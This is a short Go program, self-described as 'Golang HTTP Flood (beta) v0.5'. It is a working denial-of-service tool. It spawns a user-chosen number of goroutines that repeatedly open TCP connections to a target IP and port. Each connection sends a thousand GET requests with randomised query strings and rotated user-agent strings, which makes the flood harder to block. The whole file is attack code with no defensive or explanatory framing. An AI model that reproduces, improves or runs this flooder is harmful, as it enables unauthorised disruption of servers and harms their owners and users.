package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

type Randomizer interface {
	Seed(n int64)
	Intn(n int) int
}

type UARand struct {
	Randomizer
	UserAgents []string
}

// Read a whole file into the memory and store it as array of lines
func readUserAgents(path string) (array []string, err error) {
	var (
		file   *os.File
		part   []byte
		prefix bool
	)
	if file, err = os.Open(path); err != nil {
		return
	}
	defer file.Close()

	reader := bufio.NewReader(file)
	buffer := bytes.NewBuffer(make([]byte, 0))
	for {
		if part, prefix, err = reader.ReadLine(); err != nil {
			break
		}
		buffer.Write(part)
		if !prefix {
			array = append(array, buffer.String())
			buffer.Reset()
		}
	}
	if err == io.EOF {
		err = nil
	} else {
		fmt.Printf("Error: %s\n", err)
	}
	return
}

//Set data
func New(r Randomizer) *UARand {
	UserAgents, _ := readUserAgents(os.Args[4])
	return &UARand{r, UserAgents}
}

//GetRandomUserAgent return random user agent
func GetRandomUserAgent(gen *UARand) string {
	return gen.getRand()
}

func (u *UARand) getRand() string {
	return u.UserAgents[u.Intn(len(u.UserAgents))]
}

//flood start the thread wich floods the given server
func flood(tid int, generator *UARand) {
	ip := os.Args[1]
	port := os.Args[2]
	thread := strconv.Itoa(tid)
	addr := ip
	addr += ":"
	addr += port
	fmt.Println("Thread@", thread, " Connecting Target...")

	for {
		var useragent = GetRandomUserAgent(generator)
		var url2 = strconv.Itoa(generator.Intn(10000))
		url := "http://"
		url += ip
		url += ":"
		url += port
		url += "/?="
		url += url2

		request := "GET /?="
		request += url2
		request += " HTTP/1.1\r\nHost: "
		request += ip
		request += "\r\nConnection: Keep-Alive\r\n"
		request += "User-Agent: "
		request += useragent
		request += "\r\n\r\n"
		s, err := net.Dial("tcp", addr)
		if err != nil {
			fmt.Println("Connection Down!!!")
		}
		for i := 1; i <= 1000; i++ {
			_, err = s.Write([]byte(request))
			if err != nil {
				fmt.Println("Error with connection: ", err)
			}
			time.Sleep(time.Millisecond * 1)
		}
		fmt.Println("Threads@", thread, " Hitting Target -->", url)
		s.Close()
	}

}

func main() {

	if len(os.Args) != 5 {
		fmt.Println("Golang HTTP Flood (beta) v0.5")
		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <file with UserAgents>")
		os.Exit(1)
	}

	var threads, _ = strconv.Atoi(os.Args[3])
	fmt.Println("Flooding start.")

	generator := New(
		rand.New(
			rand.NewSource(time.Now().UnixNano()),
		),
	)

	for i := 1; i < threads+1; i++ {
		go flood(i, generator) // Start threads
		time.Sleep(time.Millisecond * 1)
	}

	var str string
	fmt.Scan(&str)

}
